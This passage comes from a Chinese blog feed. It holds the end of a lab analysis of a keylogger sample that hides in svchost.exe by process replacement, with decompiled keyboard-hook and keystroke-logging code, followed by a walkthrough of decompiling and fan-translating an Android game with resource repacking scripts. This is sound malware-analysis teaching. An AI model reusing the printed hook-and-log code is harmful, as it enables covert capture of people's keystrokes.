alt></p><p>拖入PEiD，可以看到该文件包含一些可疑字符串，猜测可能是键盘记录器。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b367d540ff41568d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>用IDA打开，反编译，摘取关键代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  AllocConsole(); <span class="comment">//创建控制台</span></span><br><span class="line">  hWnd = FindWindowA(ClassName, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hWnd )</span><br><span class="line">    ShowWindow(hWnd, <span class="number">0</span>); <span class="comment">//隐藏控制台窗口</span></span><br><span class="line">  <span class="built_in">memset</span>(byte_405350, <span class="number">1</span>, <span class="number">0x400</span>u);</span><br><span class="line">  v3 = GetModuleHandleA(<span class="number">0</span>); <span class="comment">//获取模块句柄</span></span><br><span class="line">  hhk = SetWindowsHookExA(<span class="number">13</span>, fn, v3, <span class="number">0</span>); <span class="comment">//设置监视低级键盘输入事件的钩子</span></span><br><span class="line">  <span class="keyword">while</span> ( GetMessageA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> UnhookWindowsHookEx(hhk); <span class="comment">//卸载钩子</span></span><br><span class="line"><span class="comment">//fn()</span></span><br><span class="line">  <span class="keyword">if</span> ( !code &amp;&amp; (wParam == <span class="number">0x104</span> || wParam == <span class="number">0x100</span>) ) </span><br><span class="line">  <span class="comment">//如果键盘消息标识符是0x104（WM_SYSKEYDOWN）或0x100（WM_KEYDOWN）</span></span><br><span class="line">    sub_4010C7(*(_DWORD *)lParam);</span><br><span class="line">  <span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br></pre></td></tr></table></figure></p><p>其中，对main函数中语句<code>hhk = SetWindowsHookExA(13, fn, v3, 0);</code>的说明如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>WH_KEYBOARD_LL 13</td><td>安装一个监视低级键盘输入事件的钩子过程。有关更多信息，请参阅LowLevelKeyboardProc挂接过程。</td></tr></tbody></table><p>对fn函数中语句<code>return CallNextHookEx()</code>的说明如下：</p><blockquote><p>如果nCode小于零，则挂钩过程必须返回CallNextHookEx返回的值。<br>如果nCode大于或等于零，并且钩子过程没有处理消息，强烈建议您调用CallNextHookEx并返回它返回的值; 否则，安装了WH_KEYBOARD_LL挂钩的其他应用程序将不会收到挂钩通知，因此可能会出现错误行为。</p></blockquote><p>此外，微软官方对LowLevelKeyboardProc回调函数的备注如下：</p><blockquote><p>钩子过程应该在比以下注册表项中的LowLevelHooksTimeout值中指定的数据条目更短的时间内处理消息：<br>HKEY_CURRENT_USER\Control Panel\Desktop<br>该值以毫秒为单位。如果挂钩过程超时，系统会将消息传递给下一个挂钩。</p></blockquote><p>fn函数调用的<code>sub_4010C7()</code>函数的部分代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_4010c7()</span></span><br><span class="line">  result = CreateFileA(FileName, <span class="number">0x40000000</span>u, <span class="number">2u</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//创建文件practicalmalwareanalysis.log</span></span><br><span class="line">  hFile = result;</span><br><span class="line">  <span class="keyword">if</span> ( result != (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    SetFilePointer(result, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>); <span class="comment">//设置文件指针</span></span><br><span class="line">    v2 = GetForegroundWindow(); <span class="comment">//获取当前激活的窗口</span></span><br><span class="line">    GetWindowTextA(v2, ::Buffer, <span class="number">1024</span>); <span class="comment">//获取窗口标题栏文字</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(byte_405350, ::Buffer) )</span><br><span class="line">    &#123;</span><br><span class="line">      WriteFile(hFile, aWindow, <span class="number">0xC</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//在文件中换行并写入字符串 [Window:</span></span><br><span class="line">      v3 = <span class="built_in">strlen</span>(::Buffer);</span><br><span class="line">      WriteFile(hFile, ::Buffer, v3, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//写入窗口标题栏文字</span></span><br><span class="line">      WriteFile(hFile, asc_40503C, <span class="number">4u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//写入 ]并换行</span></span><br><span class="line">      <span class="built_in">strncpy</span>(byte_405350, ::Buffer, <span class="number">0x3FF</span>u);</span><br><span class="line">      byte_40574F = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Buffer &lt; <span class="number">0x27</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Buffer &gt; <span class="number">0x40</span> )</span><br><span class="line">    <span class="comment">//对键盘输入值做判断并写入文件</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Buffer &lt;= <span class="number">0x40</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Buffer &gt;= <span class="number">0x5B</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( Buffer )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            WriteFile(hFile, asc_405074, <span class="number">1u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>同样证实了之前的部分猜测，可以看出lab03-3.exe包含的资源是一个键盘监视器，会将windows当前激活窗口上的按键记录到practicalmalwareanalysis.log文件里。<br>结合至今为止的分析，不难看出，lab03-3.exe会创建svchost.exe子进程和一个隐藏的控制台，并将键盘记录器程序写入进程内存，随后退出自身，与之前的猜想基本吻合。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>打开procmon和process explorer，并运行lab03-3.exe。</p><h4 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h4><p>可以看到lab03-3.exe创建了一个svchost.exe的子进程，随后终止，只留下svchost.exe进程。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-3ff473063252b2ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>lab03-3.exe进程结束后，部分进程如下图，可以看到新创建的svchost.exe进程的PID为1000。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-447fdd89b61874c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>双击该进程，选择<code>strings-&gt;memory</code>，可以发现进程的内存被改动过，且与localization文件中的可打印字符串完全一致，与之前分析的结果相符。（左为修改过的svchost.exe进程，右为正常的svchost.exe进程）</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-11ad32e36f41c88c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>同时，在存放lab03-3.exe的文件夹下新生成了practicalmalwareanalysis.log文件，同样符合之前对localization文件的分析结果。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-c6b83c5bf3b713e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Procmon"><a href="#Procmon" class="headerlink" title="Procmon"></a>Procmon</h4><p>根据得知的进程PID设置过滤器如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-6ccdfa3363a249d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看出该程序多次创建并写入了<code>practicalmalwareanalysis.log</code>文件。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0e8a0a364de4cfe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>打开该文件，可以看到文件里记录了一些数据，包括窗口名和1000等字样，文字格式与对sub_4010c7()函数的分析相符。联想到之前设置过滤器时曾输入过PID=1000，结合静态分析时推测的结果，进一步证实该恶意程序是键盘记录器。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e089419b612a22ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，当创建一个新的文本文档并打开时，可以看到practicalmalwareanalysis.log被更改的提示，也符合对sub_4010c7()函数的分析。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0370acd06b067e9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>随意输入一些字符，重新打开log文件后，通过增加的内容可以确认该程序的确为键盘记录器。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-3a173f686815b341.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>该恶意程序采用进程替换，首先以挂起模式创建一个新进程svchost.exe，再将该进程内存更改为资源中包含的恶意代码（键盘记录器）来达成目的。在运行该程序后，将在同一文件夹下生成一个名为practicalmalwareanalysis.log的文件，文件中记录了当前激活窗口名称及在该窗口上的按键记录。如果kill了该程序创建的svchost.exe进程，键盘记录将不再起效，机器重启时也不会自动创建该进程。</p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《ライダーあつめ》反编译过程</title>
      <link href="/2019/04/22/%E3%83%A9%E3%82%A4%E3%83%80%E3%83%BC%E3%81%82%E3%81%A4%E3%82%81%E5%8F%8D%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
      <url>/2019/04/22/%E3%83%A9%E3%82%A4%E3%83%80%E3%83%BC%E3%81%82%E3%81%A4%E3%82%81%E5%8F%8D%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>《ライダーあつめ/假面骑士收集》反编译/汉化过程<br><a id="more"></a></excerpt></p><the rest of contents | 余下全文><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大约是今年一月中旬吧，期末复习到过饱和状态，神游太虚的时候突然想起了次卡萨，结果刷小明刷了四个月（……）没有人会不喜欢井上正大.jpg</p><p>最近搜了下假面骑士的手游，安装了ライダーあつめ，三天过去了小明还是不见踪影，按照攻略摆了紫色的心和黑色的马倒是引来了一堆kaixa（……）正好友人吐槽看不懂日语，于是怒而拆包（。</p><p>这之前没做过手游汉化的工作，一切分析均基于以前打ctf时少得可怜的经验，如有错误或有更简便的办法/工具，欢迎批评指正。</p><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>与PC程序反编译时经典的IDA&amp;Ollydbg两件套不同，对Android平台程序的反编译通常采用以下三件套：</p><ul><li><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">apktool</a></li><li><a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener"><del>dex2jar</del></a></li><li><a href="https://java-decompiler.github.io/" target="_blank" rel="noopener"><del>jd-gui</del></a></li></ul><p>其中，apktool用于反编译，<del>dex2jar需要和jd-gui结合使用，用于查看项目的java源码。</del></p><p>↑ 有点麻烦，无壳apk推荐使用jadx-gui直接打开，反编译看源码一气呵成：</p><ul><li><a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">jadx-gui-0.9.0</a></li></ul><p><del>可我知道的时候已经全都搞完了，所以文章里还是dex2jar和jd-gui的组合</del></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="apk文件结构"><a href="#apk文件结构" class="headerlink" title="apk文件结构"></a>apk文件结构</h3><p>将apk后缀改为zip即可解压 ，得到如下文件。</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555940635748.png" alt="1555940635748"></p><p>其中<code>META-INF</code>文件夹主要存放apk的签名哈希证书之类的，我们不用管它，重点在<code>lib</code>和<code>res</code>文件夹，以及<code>classes.dex</code>文件。lib文件夹负责存放<code>.so</code>文件，res文件夹负责存放引用的资源，classes.dex则是编译过后的项目源码。</p><blockquote><p>不推荐直接解压，可能会出现多个dex及xml文件乱码现象</p></blockquote><p>由于Hit-Point社一贯的新手友好（……）so文件没什么用，省去了很多麻烦。</p><p>感谢error404师傅的友情陪聊（……）</p><blockquote><p>小蓝 || 灰羽 17:56:01<br>so文件看了吗？<br>花燈の恋文 17:56:18<br>。还没<br>花燈の恋文 17:56:24<br>看名字感觉不像就没看（……）<br>小蓝 || 灰羽 17:59:58<br>我觉得可能在so里<br>花燈の恋文 18:00:52<br>刚秒速看了一眼，感觉没有（<br>花燈の恋文 18:42:35<br>说实话我觉得它……没理由对文本加密啊（）<br>花燈の恋文 18:42:42<br>程序都没加壳也没做混淆（）<br>小蓝 || 灰羽 18:42:55<br>有可能动态生成啊<br>小蓝 || 灰羽 18:43:06<br>所以我才怀疑so<br>花燈の恋文 19:15:28<br>草<br>花燈の恋文 19:15:33<br>好像是utf8<br>花燈の恋文 19:15:38<br>不好意思<br>花燈の恋文 19:15:42<br>真的不好意思（…………）</p></blockquote><h3 id="反编译-系统部分汉化"><a href="#反编译-系统部分汉化" class="headerlink" title="反编译/系统部分汉化"></a>反编译/系统部分汉化</h3><p>将解压后得到的classes.dex复制到dex2jar文件夹下，打开cmd，执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure><p>得到反编译后的<code>classes-dex2jar.jar</code>文件。</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555941909536.png" alt="1555941909536"></p><p>用jd-gui打开该文件，即可看到反编译后的代码。</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555942326673.png" alt="1555942326673"></p><p>搜索字符串得知命名为”s”的文件中存在游戏中的提示文字，如商店购买提示、暗号说明等。</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555942228596.png" alt="1555942228596"></p><p>在存放apktool的文件夹下打开cmd，执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d ライダーあつめ.apk</span><br></pre></td></tr></table></figure><p>得到反编译后的文件，<code>\smali\rideratsume\toei</code>文件夹下的s.smali文件即是s.class对应的文件，打开后与jd-gui中的源码对照着，将汉化文本转为unicode并替换原文本即可。举例如下：</p><blockquote><p>が足りません -&gt; \u304c\u8db3\u308a\u307e\u305b\u3093<br>搜索并定位至\u304c\u8db3\u308a\u307e\u305b\u3093字符串<br>不足 -&gt; \u4e0d\u8db3<br>将原文本替换为\u4e0d\u8db3</p></blockquote><p>实际运行时效果如下图：</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556011296006.png" alt="1556011296006"></p><p>至此，游戏的系统文本部分可以汉化完成。</p><p>多提一句，商店部分中和购买相关的源码如下：</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555942554963.png" alt="1555942554963"></p><p>可以看出首先对所持らいだま数量进行了判断，如果不够则提示数量不足，足够的话则把らいだま的数量减少。</p><p><del>在这里可以搞事情</del></p><h3 id="提取资源-图鉴部分汉化"><a href="#提取资源-图鉴部分汉化" class="headerlink" title="提取资源/图鉴部分汉化"></a>提取资源/图鉴部分汉化</h3><p><code>res\drawable-nodpi</code>文件夹下存放了大部分图像、声音资源及图鉴文字，其中<code>evt00_data.evt</code>为文字资源。</p><p>由于日语编码原因文字可能会乱码，用notepad++等支持转码的编辑器打开，选择utf-8编码即可看到原始文档，替换完毕后再转换回ANSI编码保存。至此可以完成图鉴部分（商店物品/骑士/登场台词/怪人）的文字汉化工作。</p><p>私心截个dcd组=D</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555944290365.png" alt="1555944290365"></p><p>需要注意的是，汉化后的文本长度必须与原文长度相同。译文比原文短的话可以使用空格填充，长的话就……比较考验精简能力XD <del>汉化组真惨啊</del></p><p>挑了一个比较容易的塞翻了一下，实际运行时效果如下图：</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556027713743.png" alt="1556027713743"></p><p>同一文件夹下的img_xx_00.bin等为图像资源，构造提取脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●Bin 2 Img v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Yemu</span></span><br><span class="line"><span class="string">Create date: 19.4.22</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">从bin文件里分割png图片</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dir_list</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [path+i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(path)]</span><br><span class="line"></span><br><span class="line">bin_path=<span class="string">'./bin/'</span></span><br><span class="line">all_files=get_dir_list(bin_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> all_files:</span><br><span class="line">    os.makedirs(<span class="string">'./img/'</span>+b[len(bin_path):<span class="number">-4</span>]+<span class="string">'/'</span>)</span><br><span class="line">    f=open(b,<span class="string">'rb'</span>)</span><br><span class="line">    file=f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    pnglist=re.findall(<span class="string">b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a(.*?)\x49\x45\x4e\x44\xae\x42\x60\x82'</span>,file,re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pnglist)):</span><br><span class="line">        a=<span class="string">b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'</span>+pnglist[i]+<span class="string">b'\x49\x45\x4e\x44\xae\x42\x60\x82'</span></span><br><span class="line">        filename=<span class="string">'./img/'</span>+b[len(bin_path):<span class="number">-4</span>]+<span class="string">'/'</span>+str(i)+<span class="string">'.png'</span></span><br><span class="line">        f=open(filename,<span class="string">'wb'</span>)</span><br><span class="line">        f.write(a)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>即可得到游戏中出现的大部分图像，需要汉化的图片大部分在<code>img_cutin_name</code>文件夹下。</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1555944951267.png" alt="1555944951267"></p><p>经多次对比（……）发现bin文件首部校验和结构如下表（以img_face_shocker为例）：</p><table><thead><tr><th>十六进制</th><th>含义</th></tr></thead><tbody><tr><td>00 00 11 6A</td><td>文件大小总和（0+1+2+3+4）</td></tr><tr><td>00 05</td><td>共有5张图</td></tr><tr><td>00 00 00 00</td><td>填充位</td></tr><tr><td>00 00 03 30</td><td>0.png的大小</td></tr><tr><td>00 00 03 30</td><td>总和（0.png）</td></tr><tr><td>00 00 03 44</td><td>1.png的大小</td></tr><tr><td>00 00 06 74</td><td>总和（0+1）</td></tr><tr><td>00 00 03 4E</td><td>2.png的大小</td></tr><tr><td>00 00 09 C2</td><td>总和（0+1+2）</td></tr><tr><td>00 00 03 49</td><td>3.png的大小</td></tr><tr><td>00 00 0D 0B</td><td>总和（0+1+2+3）</td></tr><tr><td>00 00 04 5F</td><td>4.png的大小</td></tr></tbody></table><p>构造转换脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●Img 2 Bin v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Yemu</span></span><br><span class="line"><span class="string">Create date: 19.4.24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重新写入bin文件，我恨校验和</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dir_list</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [path+i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(path)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_checksum</span><span class="params">(path)</span>:</span></span><br><span class="line">    checksum=<span class="string">''</span></span><br><span class="line">    sumsize=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(os.listdir(path))):</span><br><span class="line">        img_p=path+str(i)+<span class="string">'.png'</span></span><br><span class="line">        size=str(hex(os.path.getsize(img_p))[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">        sumsize+=os.path.getsize(img_p)</span><br><span class="line">        checksum+=size+str(hex(sumsize)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">    checksum=checksum[<span class="number">-8</span>:]+str(hex(len(os.listdir(path)))[<span class="number">2</span>:].zfill(<span class="number">4</span>))+<span class="string">'00000000'</span>+checksum[:<span class="number">-8</span>]</span><br><span class="line">    <span class="keyword">return</span> bytes().fromhex(checksum)</span><br><span class="line"></span><br><span class="line">img_path=<span class="string">'./img/'</span></span><br><span class="line">new_b_path=<span class="string">'./new_bin/'</span></span><br><span class="line">all_files=get_dir_list(img_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(new_b_path): <span class="comment">#不存在则创建文件夹</span></span><br><span class="line">    os.makedirs(new_b_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(len(all_files)):</span><br><span class="line">    b_f_path=new_b_path+all_files[b][len(img_path):]+<span class="string">'.bin'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.exists(b_f_path): <span class="comment">#我也不知道我为啥要写这个，兼容辣鸡的一批</span></span><br><span class="line">        print(<span class="string">'File '</span>+b_f_path+<span class="string">' have been exist. Overwrite it？[Y/n/a(yes to all)]'</span>)</span><br><span class="line">        choose=input()</span><br><span class="line">        <span class="keyword">if</span> choose==<span class="string">'a'</span> <span class="keyword">or</span> choose==<span class="string">'A'</span>:</span><br><span class="line">            rm_list=[new_b_path+all_files[i][len(img_path):] <span class="keyword">for</span> i <span class="keyword">in</span> range(b,len(all_files))]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> rm_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    os.remove(i)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> choose==<span class="string">'n'</span> <span class="keyword">or</span> choose==<span class="string">'N'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.remove(b_f_path)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    img_p=all_files[b]+<span class="string">'/'</span></span><br><span class="line">    pad=calc_checksum(img_p)</span><br><span class="line">    bin_file=open(b_f_path,<span class="string">'ab'</span>)</span><br><span class="line">    bin_file.write(pad)<span class="comment">#写入图片校验和</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(os.listdir(img_p))):<span class="comment">#写入图片</span></span><br><span class="line">        filename=img_p+str(i)+<span class="string">'.png'</span></span><br><span class="line">        img_f=open(filename,<span class="string">'rb'</span>)</span><br><span class="line">        img=img_f.read()</span><br><span class="line">        img_f.close()</span><br><span class="line">        bin_file.write(img)</span><br><span class="line">    bin_file.close()</span><br></pre></td></tr></table></figure><p>汉化名字后实际运行的效果如图：</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556250678936.png" alt="1556250678936"></p><p>至此，理论上汉化工作可以全部完成。</p><p>实际情况嘛……有没有太太愿意揽这个体力活啊（哭</p><h3 id="重新打包"><a href="#重新打包" class="headerlink" title="重新打包"></a>重新打包</h3><p>汉化工作全部完成后，删除META-INF文件夹。此时所有文件应如下图：</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556014011664.png" alt="1556014011664"></p><p>使用<code>apktool box</code>重编译并签名，即可在真机上运行；也可使用<code>apktool</code>的<code>apptool b</code>命令进行重编译，再用签名工具签名。</p><p><img src="/2019/04/22/ライダーあつめ反编译过程/1556014219923.png" alt="1556014219923"></p><p>对签名必要性的说明引用如下：</p><blockquote><p>重新打包好的apk并不能在真机上运行，是因为真机会检测安卓程序的签名，安卓的apk在签名时会对所有源文件进行一个hash运算，安装时hash校验失败就会拒绝安装。</p></blockquote><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="图片批量生成工具"><a href="#图片批量生成工具" class="headerlink" title="图片批量生成工具"></a>图片批量生成工具</h3><p>我也不知道这一栏的意义是什么，大约是造福不会拿PS设置特殊笔刷的人吧（</p><p>折腾了小半天PIL，写了个生成仿img_cutin_name图片样式的脚本（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 